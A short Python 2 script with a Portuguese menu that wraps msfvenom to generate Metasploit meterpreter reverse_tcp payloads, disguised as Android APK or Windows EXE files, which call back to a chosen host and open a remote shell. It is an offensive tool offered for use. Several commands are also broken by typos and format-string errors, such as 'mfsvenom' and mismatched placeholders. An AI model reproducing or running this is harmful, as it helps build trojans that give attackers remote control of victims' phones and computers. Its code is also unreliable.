#!/usr/bin/python2
# -*- coding: utf-8 -*-
import os, sys
import time
def menu():
	os.system("clear")
	print '''
 ____  ____  ___  ____  ____  _____ 
(  _ \( ___)/ __)( ___)(  _ \(  _  )
 )(_) ))__) \__ \ )__)  )   / )(_)( 
(____/(____)(___/(____)(_)\_)(___/\\
	'''
	print '''
1{exploit para android}
2{exploit para windows}
3{payload personalizada}
4{sair}
	'''
	op=int(raw_input("OPÇÃO: "))
	if op == 1:
		os.system('clear')
		lhost=raw_input("LHOST: ")
		lport=int(raw_input("LPORT: "))
		nome=raw_input("NOME: ")
		os.system("clear")
		print "GERANDO APK"
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT:=%s R > exploit/%s.apk"%(lhost, lport, nome))
		os.system("clear")
		print "PRONTO"
	elif op == 2:
		os.system("clear")
		lhost=raw_input("LHOST: ")
		lport=int(raw_input("LPORT: "))
		nome=raw_input("NOME: ")
		os.system("clear")
		print "GERANDO EXE NA PASTA EXPLOIT/ %s"%(nome)
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s LPORT=%s R > /exploit/%s.exe"%(lhost, lport, nome))
		os.system("clear")
		print "PRONTO"
	elif op == 3:
		os.system("clear")
		payload=raw_input("PAYLOAD: ")
		lhost=raw_input("LHOST: ")
		lport=int(raw_input("LPORT: "))
		nome=raw_input("NOME :")
		print "EX: apk, exe etc"
		fort=raw_input("FORMATO DO EXPLOIT: ")
		print "GERANDO %fort NA PASTA EXPLOIT/%nome"%(fort, nome)
		os.system("mfsvenom -p %payload LHOST=%s LPORT=%s R > /exploit/%s.%s"(payload, lhost, lport, nome, fort))
		os.system("clear")
		print "PRONTO"
	elif op == 4:
		print "SAINDO..."
		print "CRIADOR DO SCRIPT: elionay costa\nUSER DO TELEGRAN: @deserq0101"
		time.sleep(2)
		sys.exit(0)
	else:
		print "NameError: name '%s' is not defined"%(op)
def erro():
	try:
		menu()
	except:
		print "ERRO: 404"
menu()
erro()
